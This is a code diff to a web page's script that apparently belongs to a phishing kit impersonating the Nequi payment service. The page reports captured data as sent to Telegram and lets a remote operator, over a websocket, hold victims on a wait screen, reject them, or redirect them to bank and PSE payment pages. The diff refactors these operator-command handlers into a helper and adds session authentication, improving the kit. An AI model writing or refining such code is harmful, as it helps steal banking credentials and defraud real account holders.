@@ -140,6 +140,7 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script src="/js/bank-routes.js"></script>
+    <script src="/js/session-delivery-client.js"></script>
     <script>
         let sessionId = localStorage.getItem('nequiSessionId');
         if (!sessionId) {
@@ -151,6 +152,7 @@
         const waitMessage = document.getElementById('waitMessage');
         
         const socket = io({
+            auth: { sessionId },
             transports: ['websocket', 'polling'],
             reconnection: true,
             reconnectionAttempts: 20,
@@ -203,39 +205,28 @@
             console.log('✅ Enviado a Telegram:', response);
         });
 
-        socket.on('actionFollow', (data) => {
-            if (data.sessionId !== sessionId) return;
-            
-            console.log('✅ Aprobado - Redirigiendo');
-            stopKeepAlive();
-            localStorage.setItem('fromNequi', 'true');
-
-            const bankUrl = getBankUrl(data);
-            if (bankUrl) {
-                window.location.href = bankUrl;
-            } else {
-                window.location.href = '/pse';
+        SessionDelivery.setupSessionDelivery(socket, sessionId, {
+            actionFollow(data) {
+                console.log('✅ Aprobado - Redirigiendo');
+                stopKeepAlive();
+                localStorage.setItem('fromNequi', 'true');
+                const bankUrl = getBankUrl(data);
+                window.location.href = bankUrl || '/pse';
+            },
+            actionWait(data) {
+                waitMessage.classList.add('show');
+                setTimeout(() => waitMessage.classList.remove('show'), (data.waitTime || 15) * 1000);
+            },
+            actionReject() {
+                stopKeepAlive();
+                alert('Solicitud rechazada');
+                window.location.href = '/';
+            },
+            actionApprovePSE(data) {
+                stopKeepAlive();
+                const bankUrl = getBankUrl(data);
+                window.location.href = bankUrl || '/';
             }
-        });
-
-        socket.on('actionWait', (data) => {
-            if (data.sessionId !== sessionId) return;
-            waitMessage.classList.add('show');
-            setTimeout(() => waitMessage.classList.remove('show'), (data.waitTime || 15) * 1000);
-        });
-
-        socket.on('actionReject', (data) => {
-            if (data.sessionId !== sessionId) return;
-            stopKeepAlive();
-            alert('Solicitud rechazada');
-            window.location.href = '/';
-        });
-
-        socket.on('actionApprovePSE', (data) => {
-            if (data.sessionId !== sessionId) return;
-            stopKeepAlive();
-            const bankUrl = getBankUrl(data);
-            window.location.href = bankUrl || '/';
         });
         
         socket.on('disconnect', (reason) => {
